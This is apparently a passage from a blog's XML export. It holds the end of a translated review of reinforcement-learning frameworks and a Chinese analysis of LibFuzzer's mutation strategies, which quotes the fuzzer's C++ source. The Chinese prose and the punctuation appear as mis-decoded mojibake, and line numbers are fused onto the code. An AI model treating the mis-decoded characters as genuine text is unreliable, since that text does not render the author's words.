also a huge number of policies. In fact, thereâ€™s pretty much everything you could ever need in this quiet little directory. But it is very tightly coupled to Tensorflow, if that is a problem for you. Thereâ€™s so much functionality here, but it is completely hidden. The code is reasonably well documented, but itâ€™s not exposed. You have to dig through it to find it. Again there is no pip installer. Just some custom conda install and some apt-get dependencies. So I can see that there is a huge amount of value in the algorithm implementations, but Iâ€™m going to skip the getting started this time. Surreal Surreal is a suite of applications. Foremost it is an RL framwork. But to make sure they donâ€™t build just another framework, they also provide a new Robotics simulator, an orchestrator, a cloud infrastructure provisioner and a protocol for distributed computing. It comes from Stanford, hence academic in approach and use-case, hence the default use of PyTorch. Iâ€™m all for the framework and the simulator, but it would have been easier if they had just used standard industrial components for the orchestrator (Kubernetes), infrastructure (Terraform) and protocol (Kafka/Nats/etc/etc). Those problems have already been solved. (Correction haha. Once I dug into the getting started guide, it became clear that they are using Kubernetes and Terraform. Great choices! ðŸ˜‚) The robotics simulator is a collection of MuJoCo simulations. So that is a great addition to the Environment list (despite the licensing terms of MuJoCo). The RL framework needs a big of coaxing into life. Itâ€™s another combination of apt-getâ€™s and conda installs. Oh wow. Iâ€™ve just noticed that theyâ€™ve disabled the Github issue tracker. And thereâ€™s an explict copyright notice that belongs to each of the authors. OK, so this isnâ€™t even open source. But the robosuite is MIT licenced? Very strange. Stopping here due to the lack of issues and werid licensing. RLgraph So letâ€™s start by saying RLgraph has a whopping number of commits. Theyâ€™re running at 4000 commits per year. Compare that to OpenAI Gym at just 221. Somebody needs to tell these five people to have a holiday. And itâ€™s only a year old. I can only imagine that it is being used full time. But anyway. Like other frameworks they are focusing on scalability. But interestingly they are mapping directly to both Tensorflow and Pytorch. They are not using Keras. So that must have been a massive challenge in itself. It looks like theyâ€™ve used the Ray project to distribute work like SLM-Lab. But hurray! They have a pip installer. The configuration of the agents is controlled via JSON. But only the configuration. Not the construction. Iâ€™ve just read that the authors also worked on Tensorforce, which explains some of the de ja voux I have been feeling. And I love that my complaints in Tensorforce, about how the underlying DL framework often leaks into the RL implementation code, have been addressed in RLgraph. I get the feeling that theyâ€™ve been listening to me rant to my bored wife. Separating spaces of tensors from logical composition enables us to reuse components without ever manually dealing with incompatible shapes again. Note how the above code does not contain any framework-specific notions but only defines an input dataflow from a set of spaces. Just want I always wanted. And this is achieved with an abstraction of inputs and outputs. Other than that, the API is familiar. An Environment and an Agent. Thereâ€™s a very cool Component class that abstracts the DL building blocks. However, there are abstractions that are missing here. Thereâ€™s no Policy abstractions. No exploration abstractions. Basically all the nice abstractions from Nervana Systems Coach. But Iâ€™m still pretty impressed. Getting StartedI altered the cartpole getting started example a little to use the SingleThreadedWorker and enable rendering on the environment to get the video output. Other than that it all looks very familiar. 123456789101112131415161718192021222324252627282930import numpy as npfrom rlgraph.agents import DQNAgentfrom rlgraph.environments import OpenAIGymEnvfrom rlgraph.execution import SingleThreadedWorkerenvironment = OpenAIGymEnv('CartPole-v0', monitor=".", monitor_video=1, visualize=True)# Create from .json file or dict, see agent API for all# possible configuration parameters.agent = DQNAgent.from_file( "configs/dqn_cartpole.json", state_space=environment.state_space, action_space=environment.action_space)episode_returns = []def episode_finished_callback(episode_return, duration, timesteps, **kwargs): episode_returns.append(episode_return) if len(episode_returns) % 10 == 0: print("Episode &#123;&#125; finished: reward=&#123;:.2f&#125;, average reward=&#123;:.2f&#125;.".format( len(episode_returns), episode_return, np.mean(episode_returns[-10:]) ))worker = SingleThreadedWorker(env_spec=lambda: environment, agent=agent, render=True, worker_executes_preprocessing=False, episode_finish_callback=episode_finished_callback)print("Starting workload, this will take some time for the agents to build.")# Use exploration is true for training, false for evaluation.worker.execute_timesteps(1000, use_exploration=True) Simple RL And finally, simple_rl. All other frameworks state that their goals are performance/scalability or modularity or repeatability. None of them set out to be simple. This is where simple_rl steps in. Built from the ground up to be as simple as possible. It only has two dependencies, numpy and matplotlib. And thatâ€™s only if you want to plot the results. Basically itâ€™s just numpy. It has pip installer. The documentation is non-existant but thatâ€™s ok, who needs docs? ;-) It presents a familiar collection of abstractions: an agent, an experiment, an environment that is called an mdp. The framework also abstracts other parts of the model like an action, feature, state. And a planning class that implements the strategies for next actions. It is still very modular, but some of the naming convensions should be changed to match the other frameworks (standardisation). So it is becoming apparent that â€œsimpleâ€ doesnâ€™t necesarily mean easy to understand. Generally, more abstraction makes it harder to understand. Simple in this case is â€œease of useâ€. I think thatâ€™s a shame. I really was hoping for simplicity in terms of undertanding. But it looks like it is aiming to compete with some of the more complex frameworks; Deep RL support with PyTorch is in development. There continues to be a gap in the framework market for a very simple, understandable RL framework. And Iâ€™m not sure why this framework has so few stars compared to the rest. Presumably because itâ€™s not bootstrapping on the popularity of other DL frameworks, like many of the other frameworks. Getting StartedIt should have been simple. But deep inside the code there are a few lines that force the Matplotlib to use the TkAgg backend. I tried to get TkAgg working in the Notebook but could not. It is designed for graphical desktop use, so you can imagine that it is not straightforward. I created an issues here. It should be a simple fix. If/When it works, it should be as simple as something like: 1234567891011121314from simple_rl.agents import QLearningAgent, RandomAgent, RMaxAgentfrom simple_rl.tasks import GridWorldMDPfrom simple_rl.run_experiments import run_agents_on_mdp# Setup MDP.mdp = GridWorldMDP(width=4, height=3, init_loc=(1, 1), goal_locs=[(4, 3)], lava_locs=[(4, 2)], gamma=0.95, walls=[(2, 2)], slip_prob=0.05)# Setup Agents.ql_agent = QLearningAgent(actions=mdp.get_actions())rmax_agent = RMaxAgent(actions=mdp.get_actions())rand_agent = RandomAgent(actions=mdp.get_actions())# Run experiment and make plot.run_agents_on_mdp([ql_agent, rmax_agent, rand_agent], mdp, instances=5, episodes=50, steps=10) This trains a few different agents and produces a reward plot for each. Nice eh! The only thing I would suggest is that there shouldnâ€™t be any environment implementation in simple_rl. That is out of scope. Leave that to Gym-like projects. For example, gym-minigrid has an awesome Gridworld implementation. Google RankingsGoogleâ€™s Trends search tool allows you to find out what search queries are the most popular. Unfortunately they only provide relative measures and those change depending on what you are querying. Also, common words often get mixed into other queries. For example, searching for â€œFacebook Horizonâ€ is mixed with a bunch of unrelated queries about â€œForza Horizon 4â€ and â€œfacebook log inâ€; clearly this inflates this score and cannot be trusted. I went through all of these frameworks and found that only two frameworks stood out, openai gym and google dopamine. But even for google dopamine, the related queries were google docs/scholar/translate/etc., so Iâ€™m not sure if I can trust this either. One of the things that stood out to me most was the geographical popularity. OpenAI Gym seemed to be the most popular search term, given that it has a high ranking score and all of the related queries are related to RL. But when you look at the how the ranking alters by geography, China is the country with the most searches. This strikes me as odd, because Google is banned in China and so how are they generating these statistics? Are users using VPNs and then searching, and Google is able to recognise that the original traffic is from China? Donâ€™t Trust Google TrendsAll of this brings me to the conclusion that I canâ€™t trust Google trends at all. OpenAI Gym does seem like the highest ranking RL related framework, which you might expect, but the bulk of that score is coming from China. But Google is blocked in China. Sooo.. åŽŸæ–‡åœ°å€]]></content>
      <categories>
        <category>å¼ºåŒ–å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å¤–æ–‡ç¿»è¯‘</tag>
        <tag>å¼ºåŒ–å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LibFuzzerä¸­çš„å˜å¼‚ç­–ç•¥åˆ†æž]]></title>
    <url>%2F2019%2F12%2F11%2Flibfuzzer%E4%B8%AD%E7%9A%84%E5%8F%98%E5%BC%82%E7%AD%96%E7%95%A5%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[LibFuzzeræ˜¯ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•å¼•æ“Žï¼Œæ˜¯LLVMé¡¹ç›®çš„ä¸€éƒ¨åˆ†ï¼Œåœ¨å½“å‰LLVMä¸­é»˜è®¤è¢«æ”¯æŒã€‚ç›®å‰llvm-projectæä¾›è¾ƒä¸ºæ–¹ä¾¿çš„ç¼–è¯‘æ–¹æ³•ã€‚ ç®€ä»‹LibFuzzeræ˜¯LLVMé¡¹ç›®ä¸­compiler-rtçš„ä¸€éƒ¨åˆ†ï¼Œåœ¨è¿™é‡Œæœ‰å…¶è¯¦ç»†ä½¿ç”¨è¯´æ˜Žã€‚å…¶å®ƒä½¿ç”¨è¯´æ˜ŽåŒ…æ‹¬Googleçš„2ç¯‡æ–‡ç« libFuzzerTutorialå’Œstructure-aware-fuzzingï¼Œä¸­æ–‡ç¿»è¯‘åˆ†åˆ«å¯¹åº”è¿™é‡Œå’Œè¿™é‡Œã€‚æœ¬æ–‡å°†åˆ†æžLibFuzzerçš„å˜å¼‚ç­–ç•¥ï¼Œå…¶å…³é”®ä»£ç ä½äºŽè¿™é‡Œã€‚ ç›®å‰LibFuzzerä½äºŽLLVMé¡¹ç›®ä¸­ï¼Œå› æ­¤å…¶ç¼–è¯‘æ–¹æ³•åªéœ€åœ¨åˆ›å»ºMakefileçš„è¿‡ç¨‹ä¸­æŒ‡å®šcompiler-rtå³å¯ï¼šcmake -G &quot;Unix Makefiles&quot; -DLLVM_ENABLE_PROJECTS=&quot;clang;clang-tools-extra;compiler-rt&quot;ã€‚ åœ¨ä»£ç å¼€å§‹å¤„å¯ä»¥çœ‹åˆ°Dispatcherä¸­å…¶ç”¨åˆ°çš„æ‰€æœ‰å˜å¼‚ç­–ç•¥ï¼Œå…±æœ‰15ç§ï¼Œä¸‹é¢ä¾æ¬¡è¿›è¡Œåˆ†æžã€‚ 1234567891011121314151617181920212223242526272829303132333435MutationDispatcher::MutationDispatcher(Random &amp;Rand, const FuzzingOptions &amp;Options) : Rand(Rand), Options(Options) &#123; DefaultMutators.insert( DefaultMutators.begin(), &#123; &#123;&amp;MutationDispatcher::Mutate_EraseBytes, "EraseBytes"&#125;, &#123;&amp;MutationDispatcher::Mutate_InsertByte, "InsertByte"&#125;, &#123;&amp;MutationDispatcher::Mutate_InsertRepeatedBytes, "InsertRepeatedBytes"&#125;, &#123;&amp;MutationDispatcher::Mutate_ChangeByte, "ChangeByte"&#125;, &#123;&amp;MutationDispatcher::Mutate_ChangeBit, "ChangeBit"&#125;, &#123;&amp;MutationDispatcher::Mutate_ShuffleBytes, "ShuffleBytes"&#125;, &#123;&amp;MutationDispatcher::Mutate_ChangeASCIIInteger, "ChangeASCIIInt"&#125;, &#123;&amp;MutationDispatcher::Mutate_ChangeBinaryInteger, "ChangeBinInt"&#125;, &#123;&amp;MutationDispatcher::Mutate_CopyPart, "CopyPart"&#125;, &#123;&amp;MutationDispatcher::Mutate_CrossOver, "CrossOver"&#125;, &#123;&amp;MutationDispatcher::Mutate_AddWordFromManualDictionary, "ManualDict"&#125;, &#123;&amp;MutationDispatcher::Mutate_AddWordFromPersistentAutoDictionary, "PersAutoDict"&#125;, &#125;); if(Options.UseCmp) DefaultMutators.push_back( &#123;&amp;MutationDispatcher::Mutate_AddWordFromTORC, "CMP"&#125;); if (EF-&gt;LLVMFuzzerCustomMutator) Mutators.push_back(&#123;&amp;MutationDispatcher::Mutate_Custom, "Custom"&#125;); else Mutators = DefaultMutators; if (EF-&gt;LLVMFuzzerCustomCrossOver) Mutators.push_back( &#123;&amp;MutationDispatcher::Mutate_CustomCrossOver, "CustomCrossOver"&#125;);&#125; EraseByteséšæœºåˆ é™¤Dataä¸­çš„Nä¸ªæ•°æ®ã€‚ 1234567891011size_t MutationDispatcher::Mutate_EraseBytes(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &lt;= 1) return 0; size_t N = Rand(Size / 2) + 1; assert(N &lt; Size); size_t Idx = Rand(Size - N + 1); // Erase Data[Idx:Idx+N]. memmove(Data + Idx, Data + Idx + N, Size - Idx - N); // Printf("Erase: %zd %zd =&gt; %zd; Idx %zd\n", N, Size, Size - N, Idx); return Size - N;&#125; InsertByteåœ¨Dataçš„ä¸€ä¸ªéšæœºä½ç½®æ’å…¥ä¸€ä¸ªéšæœºå­—ç¬¦ã€‚ 123456789size_t MutationDispatcher::Mutate_InsertByte(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt;= MaxSize) return 0; size_t Idx = Rand(Size + 1); // Insert new value at Data[Idx]. memmove(Data + Idx + 1, Data + Idx, Size - Idx); Data[Idx] = RandCh(Rand); return Size + 1;&#125; InsertRepeatedBytesåœ¨Dataä¸­çš„ä¸€ä¸ªéšæœºä½ç½®å¤„è¿žç»­æ’å…¥Nï¼ˆè‡³å°‘3ä¸ªï¼‰ä¸ªç›¸åŒçš„éšæœºå­—ç¬¦ã€‚ 1234567891011121314151617size_t MutationDispatcher::Mutate_InsertRepeatedBytes(uint8_t *Data, size_t Size, size_t MaxSize) &#123; const size_t kMinBytesToInsert = 3; if (Size + kMinBytesToInsert &gt;= MaxSize) return 0; size_t MaxBytesToInsert = std::min(MaxSize - Size, (size_t)128); size_t N = Rand(MaxBytesToInsert - kMinBytesToInsert + 1) + kMinBytesToInsert; assert(Size + N &lt;= MaxSize &amp;&amp; N); size_t Idx = Rand(Size + 1); // Insert new values at Data[Idx]. memmove(Data + Idx + N, Data + Idx, Size - Idx); // Give preference to 0x00 and 0xff. uint8_t Byte = Rand.RandBool() ? Rand(256) : (Rand.RandBool() ? 0 : 255); for (size_t i = 0; i &lt; N; i++) Data[Idx + i] = Byte; return Size + N;&#125; ChangeByteå°†Dataä¸­ä¸€ä¸ªéšæœºä½ç½®å¤„çš„å†…å®¹ä¿®æ”¹ä¸ºä¸€ä¸ªéšæœºå­—ç¬¦ã€‚ 1234567size_t MutationDispatcher::Mutate_ChangeByte(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; size_t Idx = Rand(Size); Data[Idx] = RandCh(Rand); return Size;&#125; ChangeBitåè½¬Dataä¸­ä¸€ä¸ªéšæœºä½ç½®å¤„çš„æ•°æ®çš„éšæœºä¸€ä½ã€‚ 1234567size_t MutationDispatcher::Mutate_ChangeBit(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; size_t Idx = Rand(Size); Data[Idx] ^= 1 &lt;&lt; Rand(8); return Size;&#125; ShuffleBytesæ‰“ä¹±Dataä¸­éšæœºä½ç½®èµ·[1,8]ä¸ªéšæœºæ•°æ®çš„é¡ºåºï¼Œç”±std::shuffleå®žçŽ°ã€‚ 12345678910size_t MutationDispatcher::Mutate_ShuffleBytes(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize || Size == 0) return 0; size_t ShuffleAmount = Rand(std::min(Size, (size_t)8)) + 1; // [1,8] and &lt;= Size. size_t ShuffleStart = Rand(Size - ShuffleAmount); assert(ShuffleStart + ShuffleAmount &lt;= Size); std::shuffle(Data + ShuffleStart, Data + ShuffleStart + ShuffleAmount, Rand); return Size;&#125; ChangeASCIIIntåœ¨Dataä¸­å¯»æ‰¾ä¸€æ®µè¿žç»­æ•°å­—æ•°æ®[B,E)ï¼Œç„¶åŽæ‰‹åŠ¨è®¡ç®—å…¶æ•°å€¼å¹¶éšæœºåšä¸€æ¬¡è®¡ç®—ï¼ˆè‡ªå¢ž1ï¼Œè‡ªå‡1ï¼Œé™¤ä»¥2ï¼Œä¹˜2ï¼Œå–å°äºŽå…¶å¹³æ–¹çš„éšæœºæ•°ï¼‰ï¼Œå¹¶å°†æ–°æ•°å€¼æ‰‹åŠ¨è§£æžä¸ºå­—ç¬¦ä¸²æ”¾å…¥[B,E)ä¸­ï¼Œä¸è¶³è¡¥0ï¼Œè¶…å‡ºæˆªæ–­ã€‚ 123456789101112131415161718192021222324252627282930313233size_t MutationDispatcher::Mutate_ChangeASCIIInteger(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; size_t B = Rand(Size); while (B &lt; Size &amp;&amp; !isdigit(Data[B])) B++; if (B == Size) return 0; size_t E = B; while (E &lt; Size &amp;&amp; isdigit(Data[E])) E++; assert(B &lt; E); // now we have digits in [B, E). // strtol and friends don't accept non-zero-teminated data, parse it manually. uint64_t Val = Data[B] - '0'; for (size_t i = B + 1; i &lt; E; i++) Val = Val * 10 + Data[i] - '0'; // Mutate the integer value. switch(Rand(5)) &#123; case 0: Val++; break; case 1: Val--; break; case 2: Val /= 2; break; case 3: Val *= 2; break; case 4: Val = Rand(Val * Val); break; default: assert(0); &#125; // Just replace the bytes with the new ones, don't bother moving bytes. for (size_t i = B; i &lt; E; i++) &#123; size_t Idx = E + B - i - 1; assert(Idx &gt;= B &amp;&amp; Idx &lt; E); Data[Idx] = (Val % 10) + '0'; Val /= 10; &#125; return Size;&#125; ChangeBinInté€‰Dataä¸­éšæœºä½ç½®å¤„çš„éšæœºé•¿åº¦ï¼ˆ8ã€4ã€2ã€1å­—èŠ‚ä¹‹ä¸€ï¼‰æ•°æ®ï¼Œå°†Sizeï¼ˆéšæœºæ•°æ®ä½äºŽDataå‰64ä¸ªä½ç½®ä¸­ï¼‰æˆ–å…¶è‡ªèº«çš„å€¼éšæœºå˜æ¢åŽæ›¿æ¢è¯¥å¤„æ•°æ®ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445size_t MutationDispatcher::Mutate_ChangeBinaryInteger(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; switch (Rand(4)) &#123; case 3: return ChangeBinaryInteger&lt;uint64_t&gt;(Data, Size, Rand); case 2: return ChangeBinaryInteger&lt;uint32_t&gt;(Data, Size, Rand); case 1: return ChangeBinaryInteger&lt;uint16_t&gt;(Data, Size, Rand); case 0: return ChangeBinaryInteger&lt;uint8_t&gt;(Data, Size, Rand); default: assert(0); &#125; return 0;&#125;template&lt;class T&gt;size_t ChangeBinaryInteger(uint8_t *Data, size_t Size, Random &amp;Rand) &#123; if (Size &lt; sizeof(T)) return 0; size_t Off = Rand(Size - sizeof(T) + 1); assert(Off + sizeof(T) &lt;= Size); T Val; if (Off &lt; 64 &amp;&amp; !Rand(4)) &#123; Val = Size; if (Rand.RandBool()) Val = Bswap(Val); &#125; else &#123; memcpy(&amp;Val, Data + Off, sizeof(Val)); T Add = Rand(21); Add -= 10; if (Rand.RandBool()) Val = Bswap(T(Bswap(Val) + Add)); // Add assuming different endiannes. else Val = Val + Add; // Add assuming current endiannes. if (Add == 0 || Rand.RandBool()) // Maybe negate. Val = -Val; &#125; memcpy(Data + Off, &amp;Val, sizeof(Val)); return Size;&#125;// compiler-rt/lib/fuzzer/FuzzerBuiltins.h// GNUinline uint8_t Bswap(uint8_t x) &#123; return x; &#125;inline uint16_t Bswap(uint16_t x) &#123; return __builtin_bswap16(x); &#125; // æŒ‰å­—èŠ‚é¡ºåºç¿»è½¬ï¼Œ0xaabb -&gt; 0xbbaainline uint32_t Bswap(uint32_t x) &#123; return __builtin_bswap32(x); &#125;inline uint64_t Bswap(uint64_t x) &#123; return __builtin_bswap64(x); &#125; CopyPartéšæœºé€‰æ‹©CopyPartOfæˆ–InsertPartOfï¼ŒCopyPartOfå°†Dataä¸­éšæœºä½ç½®çš„éšå³é•¿åº¦çš„æ•°æ®æ‹·è´åˆ°è¯¥ä½ç½®å‰çš„éšæœºä½ç½®å¤„è¿›è¡Œè¦†å†™ï¼ŒInsertPartOfå°†Dataä¸­éšæœºä½ç½®çš„éšæœºé•¿åº¦çš„æ•°æ®æ’å…¥åˆ°éšæœºä½ç½®ä¸­ï¼ˆToInsertPosæ•°æ®åŽç§»ï¼‰ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// Overwrites part of To[0,ToSize) with a part of From[0,FromSize).// Returns ToSize.size_t MutationDispatcher::CopyPartOf(const uint8_t *From, size_t FromSize, uint8_t *To, size_t ToSize) &#123; // Copy From[FromBeg, FromBeg + CopySize) into To[ToBeg, ToBeg + CopySize). size_t ToBeg = Rand(ToSize); size_t CopySize = Rand(ToSize - ToBeg) + 1; assert(ToBeg + CopySize &lt;= ToSize); CopySize = std::min(CopySize, FromSize); size_t FromBeg = Rand(FromSize - CopySize + 1); assert(FromBeg + CopySize &lt;= FromSize); memmove(To + ToBeg, From + FromBeg, CopySize); return ToSize;&#125;// Inserts part of From[0,ToSize) into To.// Returns new size of To on success or 0 on failure.size_t MutationDispatcher::InsertPartOf(const uint8_t *From, size_t FromSize, uint8_t *To, size_t ToSize, size_t MaxToSize) &#123; if (ToSize &gt;= MaxToSize) return 0; size_t AvailableSpace = MaxToSize - ToSize; size_t MaxCopySize = std::min(AvailableSpace, FromSize); size_t CopySize = Rand(MaxCopySize) + 1; size_t FromBeg = Rand(FromSize - CopySize + 1); assert(FromBeg + CopySize &lt;= FromSize); size_t ToInsertPos = Rand(ToSize + 1); assert(ToInsertPos + CopySize &lt;= MaxToSize); size_t TailSize = ToSize - ToInsertPos; if (To == From) &#123; MutateInPlaceHere.resize(MaxToSize); memcpy(MutateInPlaceHere.data(), From + FromBeg, CopySize); memmove(To + ToInsertPos + CopySize, To + ToInsertPos, TailSize); memmove(To + ToInsertPos, MutateInPlaceHere.data(), CopySize); &#125; else &#123; memmove(To + ToInsertPos + CopySize, To + ToInsertPos, TailSize); memmove(To + ToInsertPos, From + FromBeg, CopySize); &#125; return ToSize + CopySize;&#125;size_t MutationDispatcher::Mutate_CopyPart(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize || Size == 0) return 0; // If Size == MaxSize, `InsertPartOf(...)` will // fail so there's no point using it in this case. if (Size == MaxSize || Rand.RandBool()) return CopyPartOf(Data, Size, Data, Size); else return InsertPartOf(Data, Size, Data, Size, MaxSize);&#125; CrossOverä»ŽCrossOverã€InsertPartOfå’ŒCopyPartOfä¸­éšæœºé€‰æ‹©ä¸€ç§åŠ¨ä½œï¼Œå…¶ä¸­CrossOverå°†Dataå’ŒCrossOverWithä¸­çš„æ•°æ®ä»¥æ¯æ¬¡è½®æµå–éšæœºå¤§å°çš„å—äº¤å‰æŽ’åˆ—ç»„åˆåœ¨ä¸€èµ·ï¼ŒInsertPartOfå°†CrossOverWithä¸­éšæœºä½ç½®å¤„éšæœºé•¿åº¦çš„æ•°æ®æ’å…¥åˆ°Dataçš„éšæœºä½ç½®å¤„ï¼ŒCopyPartOfç”¨CrossOverWithä¸­éšæœºä½ç½®å¤„éšæœºé•¿åº¦çš„æ•°æ®å¯¹Dataéšæœºä½ç½®å¤„çš„æ•°æ®è¿›è¡Œè¦†å†™ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970size_t MutationDispatcher::Mutate_CrossOver(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; if (Size == 0) return 0; if (!CrossOverWith) return 0; const Unit &amp;O = *CrossOverWith; if (O.empty()) return 0; MutateInPlaceHere.resize(MaxSize); auto &amp;U = MutateInPlaceHere; size_t NewSize = 0; switch(Rand(3)) &#123; case 0: NewSize = CrossOver(Data, Size, O.data(), O.size(), U.data(), U.size()); break; case 1: NewSize = InsertPartOf(O.data(), O.size(), U.data(), U.size(), MaxSize); if (!NewSize) NewSize = CopyPartOf(O.data(), O.size(), U.data(), U.size()); break; case 2: NewSize = CopyPartOf(O.data(), O.size(), U.data(), U.size()); break; default: assert(0); &#125; assert(NewSize &gt; 0 &amp;&amp; "CrossOver returned empty unit"); assert(NewSize &lt;= MaxSize &amp;&amp; "CrossOver returned overisized unit"); memcpy(Data, U.data(), NewSize); return NewSize;&#125;// compiler-rt/lib/fuzzer/FuzzerLoop.cppif (Options.DoCrossOver) MD.SetCrossOverWith(&amp;Corpus.ChooseUnitToMutate(MD.GetRand()).U);// compiler-rt/lib/fuzzer/FuzzerMutate.hvoid SetCrossOverWith(const Unit *U) &#123; CrossOverWith = U; &#125;// llvm-project/compiler-rt/lib/fuzzer/FuzzerCrossOver.cpp// Cross Data1 and Data2, store the result (up to MaxOutSize bytes) in Out.size_t MutationDispatcher::CrossOver(const uint8_t *Data1, size_t Size1, const uint8_t *Data2, size_t Size2, uint8_t *Out, size_t MaxOutSize) &#123; assert(Size1 || Size2); MaxOutSize = Rand(MaxOutSize) + 1; size_t OutPos = 0; size_t Pos1 = 0; size_t Pos2 = 0; size_t *InPos = &amp;Pos1; size_t InSize = Size1; const uint8_t *Data = Data1; bool CurrentlyUsingFirstData = true; while (OutPos &lt; MaxOutSize &amp;&amp; (Pos1 &lt; Size1 || Pos2 &lt; Size2)) &#123; // Merge a part of Data into Out. size_t OutSizeLeft = MaxOutSize - OutPos; if (*InPos &lt; InSize) &#123; size_t InSizeLeft = InSize - *InPos; size_t MaxExtraSize = std::min(OutSizeLeft, InSizeLeft); size_t ExtraSize = Rand(MaxExtraSize) + 1; memcpy(Out + OutPos, Data + *InPos, ExtraSize); OutPos += ExtraSize; (*InPos) += ExtraSize; &#125; // Use the other input data on the next iteration. InPos = CurrentlyUsingFirstData ? &amp;Pos2 : &amp;Pos1; InSize = CurrentlyUsingFirstData ? Size2 : Size1; Data = CurrentlyUsingFirstData ? Data2 : Data1; CurrentlyUsingFirstData = !CurrentlyUsingFirstData; &#125; return OutPos;&#125; ManualDictåœ¨å‚æ•°-dictæŒ‡å®šçš„ManualDictionaryä¸­éšæœºé€‰æ‹©ä¸€ä¸ªWordæ’å…¥æˆ–è¦†å†™åˆ°Dataçš„éšæœºä½ç½®ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243// compiler-rt/lib/fuzzer/FuzzerMutate.h// Dictionary provided by the user via -dict=DICT_FILE.Dictionary ManualDictionary;size_t MutationDispatcher::Mutate_AddWordFromManualDictionary(uint8_t *Data, size_t Size, size_t MaxSize) &#123; return AddWordFromDictionary(ManualDictionary, Data, Size, MaxSize);&#125;size_t MutationDispatcher::AddWordFromDictionary(Dictionary &amp;D, uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; if (D.empty()) return 0; DictionaryEntry &amp;DE = D[Rand(D.size())]; Size = ApplyDictionaryEntry(Data, Size, MaxSize, DE); if (!Size) return 0; DE.IncUseCount(); CurrentDictionaryEntrySequence.push_back(&amp;DE); return Size;&#125;size_t MutationDispatcher::ApplyDictionaryEntry(uint8_t *Data, size_t Size, size_t MaxSize, DictionaryEntry &amp;DE) &#123; const Word &amp;W = DE.GetW(); bool UsePositionHint = DE.HasPositionHint() &amp;&amp; DE.GetPositionHint() + W.size() &lt; Size &amp;&amp; Rand.RandBool(); if (Rand.RandBool()) &#123; // Insert W. if (Size + W.size() &gt; MaxSize) return 0; size_t Idx = UsePositionHint ? DE.GetPositionHint() : Rand(Size + 1); memmove(Data + Idx + W.size(), Data + Idx, Size - Idx); memcpy(Data + Idx, W.data(), W.size()); Size += W.size(); &#125; else &#123; // Overwrite some bytes with W. if (W.size() &gt; Size) return 0; size_t Idx = UsePositionHint ? DE.GetPositionHint() : Rand(Size - W.size()); memcpy(Data + Idx, W.data(), W.size()); &#125; return Size;&#125; PersAutoDictåœ¨PersistentAutoDictionaryï¼ˆè¿è¡Œè¿‡ç¨‹ä¸­æœé›†æœ‰åŠ©äºŽæå‡è¦†ç›–çŽ‡çš„æ•°æ®ï¼‰ä¸­éšæœºé€‰æ‹©ä¸€ä¸ªWordæ’å…¥æˆ–è¦†å†™åˆ°Dataçš„éšæœºä½ç½®ã€‚ 12345678// compiler-rt/lib/fuzzer/FuzzerLoop.cppDictionary PersistentAutoDictionary;size_t MutationDispatcher::Mutate_AddWordFromPersistentAutoDictionary( uint8_t *Data, size_t Size, size_t MaxSize) &#123; return AddWordFromDictionary(PersistentAutoDictionary, Data, Size, MaxSize);&#125; CMP-fsanitize-coverage=trace-cmp (on by default as part of -fsanitize=fuzzer) åœ¨TableOfRecentCompares(TORC)ï¼ˆè¿è¡Œè¿‡ç¨‹ä¸­è®°å½•æ‰§è¡Œè¿‡çš„æ¯”è¾ƒæ“ä½œï¼‰ä¸­éšæœºé€‰æ‹©ä¸€ä¸ªWordæ’å…¥æˆ–è¦†å†™åˆ°Dataçš„éšæœºä½ç½®ã€‚ 12345678910111213141516171819202122232425262728293031323334353637size_t MutationDispatcher::Mutate_AddWordFromTORC( uint8_t *Data, size_t Size, size_t MaxSize) &#123; Word W; DictionaryEntry DE; switch (Rand(4)) &#123; case 0: &#123; auto X = TPC.TORC8.Get(Rand.Rand()); DE = MakeDictionaryEntryFromCMP(X.A, X.B, Data, Size); &#125; break; case 1: &#123; auto X = TPC.TORC4.Get(Rand.Rand()); if ((X.A &gt;&gt; 16) == 0 &amp;&amp; (X.B &gt;&gt; 16) == 0 &amp;&amp; Rand.RandBool()) DE = MakeDictionaryEntryFromCMP((uint16_t)X.A, (uint16_t)X.B, Data, Size); else DE = MakeDictionaryEntryFromCMP(X.A, X.B, Data, Size); &#125; break; case 2: &#123; auto X = TPC.TORCW.Get(Rand.Rand()); DE = MakeDictionaryEntryFromCMP(X.A, X.B, Data, Size); &#125; break; case 3: if (Options.UseMemmem) &#123; auto X = TPC.MMT.Get(Rand.Rand()); DE = DictionaryEntry(X); &#125; break; default: assert(0); &#125; if (!DE.GetW().size()) return 0; Size = ApplyDictionaryEntry(Data, Size, MaxSize, DE); if (!Size) return 0; DictionaryEntry &amp;DERef = CmpDictionaryEntriesDeque[CmpDictionaryEntriesDequeIdx++ % kCmpDictionaryEntriesDequeSize]; DERef = DE; CurrentDictionaryEntrySequence.push_back(&amp;DERef); return Size;&#125; Customè°ƒç”¨ç”¨æˆ·è‡ªå®šä¹‰å®žçŽ°çš„æ•°æ®å˜å¼‚æ–¹æ³•ã€‚ 12345678// ç”¨æˆ·å®šä¹‰æ–¹æ³•æŽ¥å£ï¼Œå’ŒLLVMFuzzerTestOneInputä½äºŽåŒä¸€cppä¸­// extern "C" size_t LLVMFuzzerCustomMutatorsize_t MutationDispatcher::Mutate_Custom(uint8_t *Data, size_t Size, size_t MaxSize) &#123; return EF-&gt;LLVMFuzzerCustomMutator(Data, Size, 